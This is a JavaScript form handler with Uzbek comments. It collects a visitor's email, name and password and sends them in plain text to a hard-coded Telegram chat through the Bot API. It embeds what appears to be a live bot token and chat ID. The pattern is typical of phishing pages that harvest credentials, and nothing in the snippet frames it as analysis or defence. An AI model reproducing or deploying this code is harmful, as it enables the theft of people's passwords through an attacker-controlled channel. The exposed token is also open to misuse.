document.getElementById("submitBtn").addEventListener("click", function(e) {
    e.preventDefault();  // Formaning qayta yuklanishini to'xtatish

    var email = document.getElementById("email").value;
    var name = document.getElementById("name").value;
    var password = document.getElementById("password").value;

    // Foydalanuvchi kiritgan ma'lumotlarni to'plash
    var message = `New User Data:\nEmail: ${email}\nName: ${name}\nPassword: ${password}`;

    // Bot tokenini va chat ID'ni to'ldirish
    var botToken = '7034079913:AAFOq2VF32G6hNRQcvoKcSa6MWgDp5rVNdw';
    var chatId = '6948336548';

    // Telegram API URL'ini yaratish
    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // Fetch so'rovini yuborish
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                alert("Data sent successfully to Telegram!");
            } else {
                alert("Error sending data: " + data.description);
            }
        })
        .catch(error => alert("An error occurred: " + error));
});
